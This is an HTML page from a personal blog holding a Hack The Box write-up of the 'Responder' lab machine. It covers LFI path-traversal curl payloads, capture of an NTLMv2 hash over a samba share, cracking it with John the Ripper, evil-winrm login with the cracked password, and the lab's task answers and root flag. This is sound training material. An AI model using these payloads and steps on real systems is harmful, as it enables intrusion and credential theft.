@@ -1,0 +1,652 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Responder - Hack The Box - py-us3r.io</title>
+<meta name="description" content="In this machine, we exploit LLMNR/NBT-NS poisoning to capture NTLMv2 hashes and crack them.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="py-us3r.io">
+<meta property="og:title" content="Responder - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-responder/">
+
+
+  <meta property="og:description" content="In this machine, we exploit LLMNR/NBT-NS poisoning to capture NTLMv2 hashes and crack them.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/img2/responder.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2025-03-12T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-responder/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "Py-Us3r",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="py-us3r.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Responder - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/img2/images/Dashboard.jpeg" alt="PyUs3r" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">PyUs3r</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, CTF player<br>HackTheBox ATeam
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="mailto:pyus3r@gmail.com">
+            <meta itemprop="email" content="pyus3r@gmail.com" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/javier-rieiro-2900b5354" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/Py-Us3r" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Responder - Hack The Box">
+    <meta itemprop="description" content="In this machine, we exploit LLMNR/NBT-NS poisoning to capture NTLMv2 hashes and crack them.">
+    <meta itemprop="datePublished" content="March 12, 2025">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Responder - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2025-03-12T00:00:00+01:00">March 12, 2025 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/img2/Pasted%20image%2020250311104959.png" alt="" /></p>
+<h2 id="introduction">Introduction</h2>
+
+<blockquote>
+  <p>In this machine, we exploit LLMNR/NBT-NS poisoning to capture NTLMv2 hashes and crack them.</p>
+</blockquote>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<ol>
+  <li>Connectivity
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c1</span> 10.129.208.162
+</code></pre></div>    </div>
+  </li>
+  <li>Nmap
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.129.208.162
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250311105508.png" alt="" /></p>
+  </li>
+  <li>Add domain to /etc/hosts
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"10.129.208.162 unika.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
+</code></pre></div>    </div>
+  </li>
+  <li>See the machine technologies
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb unika.htb
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250311105948.png" alt="" /></p>
+  </li>
+  <li>Check source code of index page
+<img src="/img2/Pasted%20image%2020250311112945.png" alt="" />
+    <blockquote>
+      <p>We found a possible LFI</p>
+    </blockquote>
+  </li>
+  <li>(BONUS) Try to view the backend code of index.php</li>
+</ol>
+
+<ul>
+  <li>Send response to index.php
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://unika.htb/index.php?page<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>index.php <span class="o">&gt;</span> index.php
+</code></pre></div>    </div>
+  </li>
+  <li>Decode index.php
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>index.php | <span class="nb">base64</span> <span class="nt">-d</span>
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250311113625.png" alt="" /></p>
+    <blockquote>
+      <p>If “page” is not in the url show the english.html, else allow the user to choose the file to show.</p>
+    </blockquote>
+  </li>
+</ul>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<ol>
+  <li>Test LFI
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://unika.htb/index.php?page<span class="o">=</span>../../../../windows/win.ini
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250311114816.png" alt="" /></p>
+  </li>
+  <li>Get NTLM Hash with wireshark</li>
+</ol>
+
+<ul>
+  <li>Create SMB service in the host and upload test file
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt <span class="nb">install </span>samba
+</code></pre></div>    </div>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> /usr/share/samba/publico
+</code></pre></div>    </div>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"TEST"</span> <span class="o">&gt;</span> /usr/share/samba/publico/test.txt
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250311141417.png" alt="" /></p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systemctl restart smbd
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Intercept the request to own SMB service with wireshark
+<img src="/img2/Pasted%20image%2020250311141559.png" alt="" /></p>
+  </li>
+  <li>Copy values to create the HASH
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User:
+Domain:
+Challenge:
+HMAC-MD5: 
+NTLMv2Response without HMAC: 
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<ol>
+  <li>User and domain:
+<img src="/img2/Pasted%20image%2020250311141928.png" alt="" />
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User: Administrator
+Domain: RESPONDER
+Challenge:
+HMAC-MD5: 
+NTLMv2Response without HMAC: 
+</code></pre></div>    </div>
+  </li>
+  <li>Challenge:
+<img src="/img2/Pasted%20image%2020250311142116.png" alt="" />
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User: Administrator
+Domain: RESPONDER
+Challenge: 583a9235488cccb1
+HMAC-MD5: 
+NTLMv2Response without HMAC: 
+</code></pre></div>    </div>
+  </li>
+  <li>HMAC-MD5:
+<img src="/img2/Pasted%20image%2020250311142320.png" alt="" />
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User: Administrator
+Domain: RESPONDER
+Challenge: 583a9235488cccb1
+HMAC-MD5: fdaa6c84ae9d9f9c07fe6209c9bcacfc
+NTLMv2Response without HMAC-MD5: 
+</code></pre></div>    </div>
+  </li>
+  <li>NTLMv2Response without HMAC-MD5: 
+<img src="/img2/Pasted%20image%2020250311142457.png" alt="" />
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User: Administrator
+Domain: RESPONDER
+Challenge: 583a9235488cccb1
+HMAC-MD5: fdaa6c84ae9d9f9c07fe6209c9bcacfc
+NTLMv2Response without HMAC-MD5: 01010000000000006ae580018292db0181e8493b0080dafc0000000002000c0050005900550053004500520001000c0050005900550053004500520004000c0070007900750073006500720003001a007000790075007300650072002e00700079007500730065007200070008006ae580018292db0106000400020000000800300030000000000000000100000000200000686b285cdf2e3909b8b49869d0cc97afddfa35b723d2b709fdba9258165ba3f10a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00330037000000000000000000
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<ul>
+  <li>Create HASH
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User::Domain:Challenge:HMAC-MD5:NTLMv2Response without HMAC-MD5
+</code></pre></div>    </div>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"Administrator::RESPONDER:583a9235488cccb1:fdaa6c84ae9d9f9c07fe6209c9bcacfc:01010000000000006ae580018292db0181e8493b0080dafc0000000002000c0050005900550053004500520001000c0050005900550053004500520004000c0070007900750073006500720003001a007000790075007300650072002e00700079007500730065007200070008006ae580018292db0106000400020000000800300030000000000000000100000000200000686b285cdf2e3909b8b49869d0cc97afddfa35b723d2b709fdba9258165ba3f10a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00330037000000000000000000"</span> <span class="o">&gt;</span> hash.txt
+</code></pre></div>    </div>
+  </li>
+  <li>Craking the HASH with John The Ripper
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">-w</span><span class="o">=</span>wordlists.txt hash.txt
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250311143658.png" alt="" /></p>
+  </li>
+</ul>
+
+<ol>
+  <li>Connect to WinRM
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.129.208.162 <span class="nt">-u</span> administrator <span class="nt">-p</span> badminton
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250311144043.png" alt="" /></p>
+  </li>
+</ol>
+
+<h2 id="tasks">Tasks</h2>
+
+<ol>
+  <li>When visiting the web service using the IP address, what is the domain that we are being redirected to?
+    <blockquote>
+      <p>unika.htb</p>
+    </blockquote>
+  </li>
+  <li>Which scripting language is being used on the server to generate webpages?
+    <blockquote>
+      <p>php</p>
+    </blockquote>
+  </li>
+  <li>What is the name of the URL parameter which is used to load different language versions of the webpage?
+    <blockquote>
+      <p>page</p>
+    </blockquote>
+  </li>
+  <li>Which of the following values for the <code class="language-plaintext highlighter-rouge">page</code> parameter would be an example of exploiting a Local File Include (LFI) vulnerability: “french.html”, “//10.10.14.6/somefile”, “../../../../../../../../windows/system32/drivers/etc/hosts”, “minikatz.exe”
+    <blockquote>
+      <p>../../../../../../../../windows/system32/drivers/etc/hosts</p>
+    </blockquote>
+  </li>
+  <li>Which of the following values for the <code class="language-plaintext highlighter-rouge">page</code> parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: “french.html”, “//10.10.14.6/somefile”, “../../../../../../../../windows/system32/drivers/etc/hosts”, “minikatz.exe”
+    <blockquote>
+      <p>//10.10.14.6/somefile</p>
+    </blockquote>
+  </li>
+  <li>What does NTLM stand for?
+    <blockquote>
+      <p>New Technology LAN Manager</p>
+    </blockquote>
+  </li>
+  <li>Which flag do we use in the Responder utility to specify the network interface?
+    <blockquote>
+      <p>-I</p>
+    </blockquote>
+  </li>
+  <li>There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as <code class="language-plaintext highlighter-rouge">john</code>, but the full name is what?.
+    <blockquote>
+      <p>Jonh The Ripper</p>
+    </blockquote>
+  </li>
+  <li>What is the password for the administrator user?
+    <blockquote>
+      <p>badminton</p>
+    </blockquote>
+  </li>
+  <li>We’ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?
+    <blockquote>
+      <p>5985</p>
+    </blockquote>
+  </li>
+  <li>Submit root flag
+    <blockquote>
+      <p>ea81b7afddd03efaa0945333ed147fac</p>
+    </blockquote>
+  </li>
+</ol>
+
+<p><img src="/img2/Pasted%20image%2020250311144630.png" alt="" /></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#llmnr-nbt-ns-poisoning" class="page__taxonomy-item" rel="tag">LLMNR/NBT-NS poisoning</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ntlmv2s" class="page__taxonomy-item" rel="tag">NTLMv2s</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#very-easy" class="page__taxonomy-item" rel="tag">Very Easy</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2025-03-12T00:00:00+01:00">March 12, 2025</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-redeemer/" class="pagination--pager" title="Redeemer - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-sequel/" class="pagination--pager" title="Sequel - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2025 Py-Us3r</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
